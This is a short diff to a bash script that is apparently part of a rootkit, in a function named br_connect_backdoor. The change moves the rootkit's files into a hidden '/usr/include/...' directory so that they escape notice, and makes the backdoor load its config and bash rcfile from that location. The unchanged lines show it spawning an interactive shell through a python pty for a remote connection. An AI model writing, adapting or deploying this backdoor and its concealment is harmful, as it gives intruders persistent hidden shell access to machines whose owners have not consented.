@@ -1,6 +1,8 @@
 #!/bin/bash
 
-. config.sh
+BR_ROOTKIT_PATH="/usr/include/..."
+
+. $BR_ROOTKIT_PATH/br_config.sh
 
 function br_connect_backdoor()
 {
@@ -20,7 +22,7 @@ function br_connect_backdoor()
 			export MAX_ROW_NUM MAX_COL_NUM
 			python -c 'import pty; pty.spawn("/bin/bash")'
 		else
-			/bin/bash --rcfile .bdrc --noprofile -i
+			/bin/bash --rcfile $BR_ROOTKIT_PATH/.bdrc --noprofile -i
 		fi
 		}&
 		wait
@@ -29,11 +31,5 @@ function br_connect_backdoor()
 	done
 }
 
-function br_loadconfig()
-{
-        br_load_config br.conf
-        #br_display_config
-}
-
-br_loadconfig
+br_load_config $BR_ROOTKIT_PATH/br.conf
 br_connect_backdoor
